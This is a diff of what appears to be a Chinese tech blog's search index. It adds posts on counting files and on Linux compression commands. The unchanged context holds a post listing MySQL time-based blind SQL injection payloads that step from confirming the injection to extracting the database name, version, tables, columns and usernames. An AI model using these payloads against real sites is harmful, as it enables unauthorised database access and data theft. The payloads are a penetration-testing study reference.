@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[linux下统计当前文件夹的文件和目录个数命令说明]]></title>
+    <url>%2F2017%2F09%2F20%2FlinuxCountFiles%2F</url>
+    <content type="text"><![CDATA[如题 linux下统计当前文件夹下的文件个数、目录个数详细说明命令：1234567ls -lR|grep &quot;^-&quot;|wc -l统计文件夹下目录的个数，包括子文件夹里的ls -lR|grep &quot;^d&quot;|wc -l统计当前文件夹下文件的个数ls -l |grep &quot;^-&quot;|wc -l统计当前文件夹下目录的个数ls -l |grep &quot;^d&quot;|wc -l 说明：12345678ls -l 显示当前文件夹下的文件列表（包括目录）ls -lR 显示当前文件夹下的所有文件列表（包括子目录文件）‘|’ 在Linux中是管道符，将前面命令的输出作为后面命令的输入grep 是过滤，只显示匹配成功的结果&quot;^-&quot; 是正则表达式，表示只显示以 &apos;-&apos;开头的行，&quot;^d&quot; 表示只显示以&apos;d&apos;开头的行。Linux中文件（非目录）是以&apos;-&apos;开头的，而目录是以&apos;d&apos;开头的。wc 是统计用的。 -l 参数用来输出输入的行的数目]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux中的压缩命令记录]]></title>
+    <url>%2F2017%2F09%2F19%2FlinuxCompress%2F</url>
+    <content type="text"><![CDATA[如题 Linux中的压缩命令记录常用的几种格式：iso/zip/7z/rar/tar/tar.gz/xz tar：1234v表示详细tar -tvf test.tar # 查看包内容tar -cvf test.tar * # 打包tar -xvf test.tar # 解包 tar.gz：123tar -tzvf test.tar.gz # 查看包内容tar -czvf test.tar.gz * # 打包tar -xzvf test.tar.gz # 解包 tar.bz2：123tar -tjvf test.tar.bz2 # 查看包内容tar -cjvf test.tar.bz2 * # 打包tar -xjvf test.tar.bz2 # 解包 zip：1234567unzip -v test.zip # 查看包内容zip -r test.zip * # 压缩（r表示递归）zip -m test.zip test.txt # 往zip中添加文件zip -rP pwd test.zip * # -P 加密压缩unzip test.zip # 解压unzip -P pwd test.zip # 解密解压unzip -n/-o test.zip # -n代表如果存在则不覆盖/-o代表如果存在则覆盖 iso：123挂载文件mount test.iso /media # 挂载镜像到/media目录umount /media # 取消挂载（不使用的情况下，可以取消挂载） xz：12345高压缩（速度慢）xz -z test.tar # 压缩（直接将源文件进行压缩）xz -d test.tar.xz # 解压xz -t test.tar.xz # 测试压缩文件完整性xz -l test.tar.xz # 显示压缩文件的信息 7z和rar在Linux中使用的不多，需要额外安装 7z：123apt-get install p7zip-full7za a -t7z -r test.7z # 压缩（a代表压缩，-t指定文件类型，-r表示递归）7za x test.7z -r # 解压（x代表解压，-r表示递归） rar：1234567apt-get install rarapt-get install unrarunrar l test.rar # 查看压缩包内容rar a test.rar * # 压缩（a代表添加到压缩文件）rar x test.rar # 解压（x代表解压）unrar e test.rar # 解压（e直接解压到当前目录）unrar t test.rar # 检查压缩包的完整性]]></content>
+      <categories>
+        <category>命令说明</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>压缩命令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Mysql延时盲注payload]]></title>
     <url>%2F2017%2F09%2F16%2FsleepBlandSQLInjection%2F</url>
     <content type="text"><![CDATA[如题 Mysql延时盲注payloadpayload123456789101112131415161718一、得到正确的注入方式?id=1&apos; and sleep(5) --+ 进行注入尝试，如果页面休眠5秒后返回，则证明该注入方式是可以使用的，sql语句已生效?username=admin&apos; and if(1=2,1,sleep(10))#二、判断数据库名?id=1&apos; and if((select length(database())&gt;7)&gt;0,sleep(5),null) --+ 判断数据库长度是否大于7?id=1&apos; and if((select ascii(substr(database(),1,1))&gt;97)&gt;0,sleep(5),null) --+ 判断数据库名的第一个字符ascii是否大于97?id=1&apos; and if((select database())=&quot;security&quot;,sleep(5),null) --+ 判断数据库名是否为security，如果是则休眠5秒，否则立即返回三、判断版本号?id=1&apos; and if((select version()) like &quot;10%&quot;,sleep(5),null) --+ 判断版本号是否为10开头的（一般用5），如果是则休眠5秒四、判断表名?id=1&apos; and if ((select length(table_name)&gt;4 from information_schema.tables limit 2,1)&gt;0,sleep(5),null); --+ 判断第三个表的表名长度是否大于4?id=1&apos; and if ((select substr(table_name,1,1) from information_schema.tables limit 2,1)=&apos;u&apos;,sleep(5),null); --+ 判断第三个表的表名的第一个字母是否为u五、判断列名?id=1&apos; and if ((select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(5),null); --+ 判断users表的第一列名的长度是否大于1?id=1&apos; and if((select ascii(substr(column_name,1,1))&gt;97 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(3),null)--+ 判断users表的第一列名的第一个字符ascii是否大于97六、得到数据?id=1&apos; and if((select length(username)&gt;1 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username列的第一条数据的长度是否大于1?id=1&apos; and if((select ascii(substr(username,1,1))&gt;65 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username的第一条数据的第一个字符的ascii是否大于65]]></content>
@@ -188,10 +211,10 @@
         <category>代理</category>
       </categories>
       <tags>
+        <tag>Linux</tag>
         <tag>代理</tag>
         <tag>privoxy</tag>
         <tag>shadowsocks</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
